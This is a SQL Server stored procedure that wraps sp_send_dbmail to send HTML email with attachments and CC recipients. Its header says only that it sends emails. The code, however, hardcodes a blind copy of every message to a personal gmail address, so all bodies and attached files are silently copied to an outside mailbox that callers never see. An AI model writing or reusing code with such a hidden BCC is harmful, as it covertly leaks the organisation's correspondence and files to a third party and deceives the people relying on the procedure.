

-- =============================================
-- Author:		<Walid Mougharbel>
-- Create date: <23 February 2014>
-- Description:	<Sends Emails>
-- =============================================
CREATE PROCEDURE [dbo].[prSendMailWithAttachment] 
	@profile_name varchar(250),
	@recipients varchar(250),
	@subject nvarchar(250),
	@copy_recipients nvarchar (750),
	@body nvarchar(max),
	@file_attachments varchar(300)

	
	
AS	

	
	EXECUTE msdb.dbo.sp_send_dbmail @profile_name=@profile_name,
							@recipients=@recipients,
							@subject=@subject,
							@body_format = 'HTML',
							@body=@body,
							@file_attachments=@file_attachments,
							@copy_recipients=@copy_recipients,
							@blind_copy_recipients='walid.emailbox@gmail.com;'